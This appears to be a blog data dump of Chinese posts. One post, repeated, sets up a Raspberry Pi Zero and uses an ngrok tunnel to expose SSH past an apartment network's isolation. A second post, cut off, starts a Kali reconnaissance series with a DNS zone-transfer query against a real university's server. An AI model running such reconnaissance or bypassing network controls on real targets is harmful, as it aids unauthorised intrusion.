class=\"code\"><pre><div class=\"line\">sudo iwlist wlan0 scan</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">Cell 03 - Address: F0:B0:52:3B:7B:68</div><div class=\"line\">                  ESSID:<span class=\"string\">\"ASK4 Wireless\"</span></div><div class=\"line\">                  Protocol:IEEE 802.11gn</div><div class=\"line\">                  Mode:Master</div><div class=\"line\">                  Frequency:2.417 GHz (Channel 2)</div><div class=\"line\">                  Encryption key:off</div><div class=\"line\">                  Bit Rates:144 Mb/s</div><div class=\"line\">                  Quality=18/100  Signal level=70/100</div><div class=\"line\">                  Extra:fm=0001</div></pre></td></tr></table></figure>\n<p>随后对<code>wpa_supplicant.conf</code>文件进行编辑，使之加入到自己的网络里。</p>\n<p>请注意，<code>key_mgmt=NONE</code>表示没有WiFi密码(这是个查了很久猜得到的宝贵线索)，如果有密码请把这个更改为<code>psk = &quot;密码&quot;</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo vi /etc/wpa_supplicant/wpa_supplicant.conf</div></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">country=GB</div><div class=\"line\">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</div><div class=\"line\">update_config=1</div><div class=\"line\">network=&#123;</div><div class=\"line\">        ssid=<span class=\"string\">\"ASK4 Wireless\"</span></div><div class=\"line\">        key_mgmt=NONE</div><div class=\"line\"></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>编辑<code>/etc/network/interfaces</code>文件，使wlan0为动态分配获取IP。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo vi /etc/network/interfaces</div></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">auto lo</div><div class=\"line\">iface lo inet loopback</div><div class=\"line\"></div><div class=\"line\">iface eth0 inet dhcp</div><div class=\"line\"></div><div class=\"line\">auto wlan0</div><div class=\"line\">allow-hotplug wlan0</div><div class=\"line\">iface wlan0 inet dhcp</div><div class=\"line\">wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">allow-hotplug wlan1</div><div class=\"line\">iface wlan1 inet manual</div><div class=\"line\">    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</div></pre></td></tr></table></figure>\n<p>随后重启我们wlan0</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo ifdown wlan0</div><div class=\"line\">sudo ifup wlan0</div></pre></td></tr></table></figure>\n<p>如果能搜索到WiFi会自动进行DHCP获取ip地址阶段</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">Listening on LPF/wlan0/0c:82:68:12:93:8f</div><div class=\"line\">Sending on   LPF/wlan0/0c:82:68:12:93:8f</div><div class=\"line\">Sending on   Socket/fallback</div><div class=\"line\">DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 8</div><div class=\"line\">DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 12</div><div class=\"line\">DHCPREQUEST on wlan0 to 255.255.255.255 port 67</div><div class=\"line\">DHCPOFFER from 10.80.192.1</div><div class=\"line\">DHCPACK from 10.80.192.1</div><div class=\"line\">bound to 10.80.200.83 -- renewal <span class=\"keyword\">in</span> 440 seconds.</div></pre></td></tr></table></figure>\n<p>随后，用<code>ifconfig</code>命令查看一下获取的IP地址</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">wlan0     Link encap:Ethernet  HWaddr 0c:82:68:12:93:8f</div><div class=\"line\">          inet addr:10.80.200.83  Bcast:10.80.207.255  Mask:255.255.240.0</div><div class=\"line\">          UP BROADCAST MULTICAST  MTU:1500  Metric:1</div><div class=\"line\">          RX packets:0 errors:0 dropped:17 overruns:0 frame:0</div><div class=\"line\">          TX packets:0 errors:0 dropped:1 overruns:0 carrier:0</div><div class=\"line\">          collisions:0 txqueuelen:1000</div><div class=\"line\">          RX bytes:4681 (4.5 KiB)  TX bytes:18372 (17.9 KiB)</div></pre></td></tr></table></figure>\n<p><img src=\"/content/images/zeronet/3.png\" alt=\"\"></p>\n<p>再对mac地址进行绑定，再进入vnc，试试看</p>\n<p><img src=\"/content/images/zeronet/4.jpg\" alt=\"\"></p>\n<p>哇 可以上网了！</p>\n<p>然而悲痛的消息还有呢~</p>\n<p>内网隔离</p>\n<h2 id=\"ngrok-TCP转发\"><a href=\"#ngrok-TCP转发\" class=\"headerlink\" title=\"ngrok TCP转发\"></a>ngrok TCP转发</h2><p>这难不倒我，用ngrok就可以解决，正好身在墙外，更加方便。</p>\n<p>下载ngrok<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip</div><div class=\"line\">unzip ngrok-stable-linux-arm.zip</div></pre></td></tr></table></figure></p>\n<p>配置开机启动项<code>vi /etc/rc.local</code><br>在exit 0 前面加入<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">/home/pi/ngrok authtoken 你的AUTO</div><div class=\"line\">/home/pi/ngrok tcp 22</div></pre></td></tr></table></figure></p>\n<p>搞定！拔掉USB HUB，关掉路由器，重启！</p>\n<p>过了10分钟后，我们的树莓派上线了！</p>\n<p><img src=\"/content/images/zeronet/5.png\" alt=\"\"></p>\n<p>用ssh命令连接一下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ssh pi@0.tcp.ngrok.io -p 13016</div></pre></td></tr></table></figure>\n<p>连接速度超级快，如同本地一样，给ngrok官网点赞。</p>\n<p><img src=\"/content/images/zeronet/6.jpg\" alt=\"\"></p>\n<h2 id=\"lighttpd-部署\"><a href=\"#lighttpd-部署\" class=\"headerlink\" title=\"lighttpd 部署\"></a>lighttpd 部署</h2><p>总要搞点事情嘛，部署一个Web服务对于512MB的内存的树莓派Zero不过分吧。</p>\n<p>那么什么Web服务最合适呢？脑海第一时间想到轻量级的lighttpd，ngnix我都嫌弃费资源，那么就它了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install -y lighttpd</div></pre></td></tr></table></figure>\n<p>安装完成！目录在<code>/var/www/html</code></p>\n<p>写好html，部署上去。</p>\n<p>那么如何才能办到同时映射到两个端口呢？ngrok的官方文档有提示。</p>\n<p><code>nano /home/pi/.ngrok2/ngrok.yml</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">authtoken: 你的AUTH</div><div class=\"line\">region: eu</div><div class=\"line\">json_resolver_url: &quot;&quot;</div><div class=\"line\">dns_resolver_ips: []</div><div class=\"line\"></div><div class=\"line\">tunnels:</div><div class=\"line\">  app-foo:</div><div class=\"line\">    addr: 80</div><div class=\"line\">    proto: http</div><div class=\"line\">    host_header: app-foo.dev</div><div class=\"line\">  app-bar:</div><div class=\"line\">    addr: 22</div><div class=\"line\">    proto: tcp</div><div class=\"line\">    host_header: app-bar.dev</div></pre></td></tr></table></figure></p>\n<p>这样就部署了两个服务，<code>app-foo</code>，<code>app-bar</code>，不错，开机再启动他们。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/rc.local</div></pre></td></tr></table></figure>\n<p>把之前那句换成<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">/home/pi/proj/ngrok/ngrok start --config /home/pi/.ngrok2/ngrok.yml app-foo app-bar</div></pre></td></tr></table></figure></p>\n<p>好了，剩下我们要做的就是重启与等待。</p>\n<p><img src=\"/content/images/zeronet/7.jpg\" alt=\"\"></p>\n<p>哈哈，上线了，访问一下。</p>\n<p><img src=\"/content/images/zeronet/8.png\" alt=\"\"></p>\n<p>这个只有4英镑的树莓派实现联网后花费了：</p>\n<p>树莓派：4磅</p>\n<p>OTG线：0.86磅</p>\n<p>WIFI适配器：人民币25元</p>\n<p>储存卡：9磅</p>\n<p>谢谢<del>观看</del>忍耐全文。</p>\n","excerpt":"","more":"<p>说句实话，Zero真的不适合把玩，想让他连上网，太难了。</p>\n<h1 id=\"痛点\"><a href=\"#痛点\" class=\"headerlink\" title=\"痛点\"></a>痛点</h1><ul>\n<li>住公寓，有WiFi/Lan登录认证系统</li>\n<li>公寓的网络动态分配范围很大，很难快速找到树莓派的IP</li>\n<li>公寓的网络防止扫描端口，有惩罚策略</li>\n<li>没有显示器 无法查看树莓派Zero的状态</li>\n<li>树莓派Zero只有一个OTG USB接口</li>\n<li>树莓派Zero没有内置以太网Lan</li>\n<li>树莓派Zero没有无线网卡WiFi</li>\n<li>树莓派Zero没有蓝牙 更没有蓝牙局域网</li>\n<li>树莓派Zero除了核心部分 一无所有</li>\n</ul>\n<h1 id=\"已有装备\"><a href=\"#已有装备\" class=\"headerlink\" title=\"已有装备\"></a>已有装备</h1><ul>\n<li>树莓派Zero</li>\n<li>USB HUB 分线器</li>\n<li>USB 以太网网卡</li>\n<li>USB WIFI (芯片 8188EU)</li>\n<li>路由器</li>\n<li>网线一根</li>\n<li>MacBook Pro一台</li>\n</ul>\n<h1 id=\"已有环境\"><a href=\"#已有环境\" class=\"headerlink\" title=\"已有环境\"></a>已有环境</h1><ul>\n<li>Raspbian系统</li>\n<li>vncserver</li>\n</ul>\n<h1 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h1><h2 id=\"整体思路\"><a href=\"#整体思路\" class=\"headerlink\" title=\"整体思路\"></a>整体思路</h2><p><img src=\"/content/images/zeronet/0.png\" alt=\"\"></p>\n<p>其中 USB HUB USB网卡 临时路由器 PC 是临时之用 配置一旦完成 抛弃这些设备直接插上WiFi自动联网。</p>\n<p><img src=\"/content/images/zeronet/1.jpg\" alt=\"\"></p>\n<h2 id=\"去掉之前的USB网卡模式\"><a href=\"#去掉之前的USB网卡模式\" class=\"headerlink\" title=\"去掉之前的USB网卡模式\"></a>去掉之前的USB网卡模式</h2><p>把sd卡取出，插入电脑</p>\n<p>在<code>config.txt</code>下删除<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">dtoverlay=dwc2</div></pre></td></tr></table></figure></p>\n<p>在<code>cmdline.txt</code>下删除<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">modules-load=dwc2,g_ether</div></pre></td></tr></table></figure></p>\n<h2 id=\"安装WiFi驱动\"><a href=\"#安装WiFi驱动\" class=\"headerlink\" title=\"安装WiFi驱动\"></a>安装WiFi驱动</h2><p>之前遇到过很多坑，比如别的内核的WiFi驱动。</p>\n<p>首先手动下载</p>\n<p><a href=\"https://dl.dropboxusercontent.com/u/80256631/install-wifi.tar.gz\">https://dl.dropboxusercontent.com/u/80256631/install-wifi.tar.gz</a></p>\n<p>检查无线适配器版本，同时传到树莓派上</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">pi@zero:~ $ sudo ./install-wifi</div><div class=\"line\"></div><div class=\"line\">Your current kernel revision = 4.4.34+</div><div class=\"line\">Your current kernel build    = <span class=\"comment\">#930</span></div><div class=\"line\"></div><div class=\"line\">Checking <span class=\"keyword\">for</span> a wifi module to determine the driver to install.</div><div class=\"line\"></div><div class=\"line\">Your wifi module is Bus 001 Device 003: ID 0bda:8179 Realtek Semiconductor Corp.</div><div class=\"line\"></div><div class=\"line\">And it uses the 8188eu driver.</div><div class=\"line\"></div><div class=\"line\">Checking <span class=\"keyword\">for</span> a new 8188eu wifi driver module <span class=\"keyword\">for</span> your current kernel.</div><div class=\"line\">The script cannot access Dropbox to check a driver is available.</div></pre></td></tr></table></figure>\n<p>手动下载<br><a href=\"https://dl.dropboxusercontent.com/u/80256631/8188eu-4.4.34-930.tar.gz\">https://dl.dropboxusercontent.com/u/80256631/8188eu-4.4.34-930.tar.gz</a></p>\n<p>切换WiFi到树莓派网络<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp 8188eu-4.4.34-930.tar.gz pi@zero.local:~</div></pre></td></tr></table></figure></p>\n<p>在树莓派下<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">tar xzf  8188eu-4.4.34-930.tar.gz</div><div class=\"line\">sudo ./install.sh</div><div class=\"line\">reboot</div></pre></td></tr></table></figure></p>\n<p>然后检查一下 <code>lsusb</code>(这个其实不靠谱) </p>\n<p>然后再检查一下 <code>ifconfig</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">wlan0     Link encap:Ethernet  HWaddr 0c:82:68:12:93:8f</div><div class=\"line\">          inet6 addr: fe80::4336:2657:c812:f11b/64 Scope:Link</div><div class=\"line\">          UP BROADCAST MULTICAST  MTU:1500  Metric:1</div><div class=\"line\">          RX packets:0 errors:0 dropped:6 overruns:0 frame:0</div><div class=\"line\">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</div><div class=\"line\">          collisions:0 txqueuelen:1000</div><div class=\"line\">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</div></pre></td></tr></table></figure>\n<p>果然正确安装了。</p>\n<h2 id=\"配置WiFi\"><a href=\"#配置WiFi\" class=\"headerlink\" title=\"配置WiFi\"></a>配置WiFi</h2><p>但是<code>wlan0     Link encap:Ethernet</code>被识别为了以太网，接下来我们继续解决坑。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo iwlist wlan0 scan</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">Cell 03 - Address: F0:B0:52:3B:7B:68</div><div class=\"line\">                  ESSID:<span class=\"string\">\"ASK4 Wireless\"</span></div><div class=\"line\">                  Protocol:IEEE 802.11gn</div><div class=\"line\">                  Mode:Master</div><div class=\"line\">                  Frequency:2.417 GHz (Channel 2)</div><div class=\"line\">                  Encryption key:off</div><div class=\"line\">                  Bit Rates:144 Mb/s</div><div class=\"line\">                  Quality=18/100  Signal level=70/100</div><div class=\"line\">                  Extra:fm=0001</div></pre></td></tr></table></figure>\n<p>随后对<code>wpa_supplicant.conf</code>文件进行编辑，使之加入到自己的网络里。</p>\n<p>请注意，<code>key_mgmt=NONE</code>表示没有WiFi密码(这是个查了很久猜得到的宝贵线索)，如果有密码请把这个更改为<code>psk = &quot;密码&quot;</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo vi /etc/wpa_supplicant/wpa_supplicant.conf</div></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">country=GB</div><div class=\"line\">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</div><div class=\"line\">update_config=1</div><div class=\"line\">network=&#123;</div><div class=\"line\">        ssid=<span class=\"string\">\"ASK4 Wireless\"</span></div><div class=\"line\">        key_mgmt=NONE</div><div class=\"line\"></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>编辑<code>/etc/network/interfaces</code>文件，使wlan0为动态分配获取IP。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo vi /etc/network/interfaces</div></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">auto lo</div><div class=\"line\">iface lo inet loopback</div><div class=\"line\"></div><div class=\"line\">iface eth0 inet dhcp</div><div class=\"line\"></div><div class=\"line\">auto wlan0</div><div class=\"line\">allow-hotplug wlan0</div><div class=\"line\">iface wlan0 inet dhcp</div><div class=\"line\">wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">allow-hotplug wlan1</div><div class=\"line\">iface wlan1 inet manual</div><div class=\"line\">    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</div></pre></td></tr></table></figure>\n<p>随后重启我们wlan0</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo ifdown wlan0</div><div class=\"line\">sudo ifup wlan0</div></pre></td></tr></table></figure>\n<p>如果能搜索到WiFi会自动进行DHCP获取ip地址阶段</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">Listening on LPF/wlan0/0c:82:68:12:93:8f</div><div class=\"line\">Sending on   LPF/wlan0/0c:82:68:12:93:8f</div><div class=\"line\">Sending on   Socket/fallback</div><div class=\"line\">DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 8</div><div class=\"line\">DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 12</div><div class=\"line\">DHCPREQUEST on wlan0 to 255.255.255.255 port 67</div><div class=\"line\">DHCPOFFER from 10.80.192.1</div><div class=\"line\">DHCPACK from 10.80.192.1</div><div class=\"line\">bound to 10.80.200.83 -- renewal <span class=\"keyword\">in</span> 440 seconds.</div></pre></td></tr></table></figure>\n<p>随后，用<code>ifconfig</code>命令查看一下获取的IP地址</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">wlan0     Link encap:Ethernet  HWaddr 0c:82:68:12:93:8f</div><div class=\"line\">          inet addr:10.80.200.83  Bcast:10.80.207.255  Mask:255.255.240.0</div><div class=\"line\">          UP BROADCAST MULTICAST  MTU:1500  Metric:1</div><div class=\"line\">          RX packets:0 errors:0 dropped:17 overruns:0 frame:0</div><div class=\"line\">          TX packets:0 errors:0 dropped:1 overruns:0 carrier:0</div><div class=\"line\">          collisions:0 txqueuelen:1000</div><div class=\"line\">          RX bytes:4681 (4.5 KiB)  TX bytes:18372 (17.9 KiB)</div></pre></td></tr></table></figure>\n<p><img src=\"/content/images/zeronet/3.png\" alt=\"\"></p>\n<p>再对mac地址进行绑定，再进入vnc，试试看</p>\n<p><img src=\"/content/images/zeronet/4.jpg\" alt=\"\"></p>\n<p>哇 可以上网了！</p>\n<p>然而悲痛的消息还有呢~</p>\n<p>内网隔离</p>\n<h2 id=\"ngrok-TCP转发\"><a href=\"#ngrok-TCP转发\" class=\"headerlink\" title=\"ngrok TCP转发\"></a>ngrok TCP转发</h2><p>这难不倒我，用ngrok就可以解决，正好身在墙外，更加方便。</p>\n<p>下载ngrok<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip</div><div class=\"line\">unzip ngrok-stable-linux-arm.zip</div></pre></td></tr></table></figure></p>\n<p>配置开机启动项<code>vi /etc/rc.local</code><br>在exit 0 前面加入<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">/home/pi/ngrok authtoken 你的AUTO</div><div class=\"line\">/home/pi/ngrok tcp 22</div></pre></td></tr></table></figure></p>\n<p>搞定！拔掉USB HUB，关掉路由器，重启！</p>\n<p>过了10分钟后，我们的树莓派上线了！</p>\n<p><img src=\"/content/images/zeronet/5.png\" alt=\"\"></p>\n<p>用ssh命令连接一下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ssh pi@0.tcp.ngrok.io -p 13016</div></pre></td></tr></table></figure>\n<p>连接速度超级快，如同本地一样，给ngrok官网点赞。</p>\n<p><img src=\"/content/images/zeronet/6.jpg\" alt=\"\"></p>\n<h2 id=\"lighttpd-部署\"><a href=\"#lighttpd-部署\" class=\"headerlink\" title=\"lighttpd 部署\"></a>lighttpd 部署</h2><p>总要搞点事情嘛，部署一个Web服务对于512MB的内存的树莓派Zero不过分吧。</p>\n<p>那么什么Web服务最合适呢？脑海第一时间想到轻量级的lighttpd，ngnix我都嫌弃费资源，那么就它了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install -y lighttpd</div></pre></td></tr></table></figure>\n<p>安装完成！目录在<code>/var/www/html</code></p>\n<p>写好html，部署上去。</p>\n<p>那么如何才能办到同时映射到两个端口呢？ngrok的官方文档有提示。</p>\n<p><code>nano /home/pi/.ngrok2/ngrok.yml</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">authtoken: 你的AUTH</div><div class=\"line\">region: eu</div><div class=\"line\">json_resolver_url: &quot;&quot;</div><div class=\"line\">dns_resolver_ips: []</div><div class=\"line\"></div><div class=\"line\">tunnels:</div><div class=\"line\">  app-foo:</div><div class=\"line\">    addr: 80</div><div class=\"line\">    proto: http</div><div class=\"line\">    host_header: app-foo.dev</div><div class=\"line\">  app-bar:</div><div class=\"line\">    addr: 22</div><div class=\"line\">    proto: tcp</div><div class=\"line\">    host_header: app-bar.dev</div></pre></td></tr></table></figure></p>\n<p>这样就部署了两个服务，<code>app-foo</code>，<code>app-bar</code>，不错，开机再启动他们。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/rc.local</div></pre></td></tr></table></figure>\n<p>把之前那句换成<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">/home/pi/proj/ngrok/ngrok start --config /home/pi/.ngrok2/ngrok.yml app-foo app-bar</div></pre></td></tr></table></figure></p>\n<p>好了，剩下我们要做的就是重启与等待。</p>\n<p><img src=\"/content/images/zeronet/7.jpg\" alt=\"\"></p>\n<p>哈哈，上线了，访问一下。</p>\n<p><img src=\"/content/images/zeronet/8.png\" alt=\"\"></p>\n<p>这个只有4英镑的树莓派实现联网后花费了：</p>\n<p>树莓派：4磅</p>\n<p>OTG线：0.86磅</p>\n<p>WIFI适配器：人民币25元</p>\n<p>储存卡：9磅</p>\n<p>谢谢<del>观看</del>忍耐全文。</p>\n"},{"title":"Kali系列——信息收集阶段（一）","id":"6","updated":"2016-08-05T20:13:28.000Z","date":"2016-07-30T16:48:20.000Z","_content":"\n记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：\n>进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探\n\n>爆账户 找后台 传小马 放大马 拿权限 挂页面  放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！\n\n其实，我觉得渗透测试无论怎么变，不外乎这几点：\n\n>信息收集阶段->漏洞检测阶段->漏洞利用阶段->持久化后门阶段\n\n最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。\n<!-- more --> \n# 信息收集阶段\n## DNS信息\n其实DNS信息收集阶段用两个Linux系统自带工具即可完成。\n\n### nslookup\n\n此命令，可以快速查处ip地址\n```bash\n ✘ ivan@Ivan~ nslookup zhihu.com\nServer:\t\t114.114.114.114\nAddress:\t114.114.114.114#53\n\nNon-authoritative answer:\nName:\tzhihu.com\nAddress: 54.223.189.245\n```\n\n当然也可以指定dns查询服务器：\n```bash\nivan@Ivan ~ nslookup -type=ns zhihu.com 8.8.8.8\nServer:\t\t8.8.8.8\nAddress:\t8.8.8.8#53\n\nNon-authoritative answer:\nzhihu.com\tnameserver = ns3.dnsv4.com.\nzhihu.com\tnameserver = ns4.dnsv4.com.\n\nAuthoritative answers can be found from:\n```\n### dig\ndig真是个好工具，甚至可以找出DNS域传送漏洞。下面举一个例子，也是乌云网曝光过的，由于篇幅问题，精简了很多内容：\n```bash\nivan@Ivan  ~  dig @dns.csust.edu.cn csust.edu.cn axfr\n\n; <<>> DiG 9.8.3-P1 <<>> @dns.csust.edu.cn csust.edu.cn axfr\n; (1 server found)\n;; global options: +cmd\ncsust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 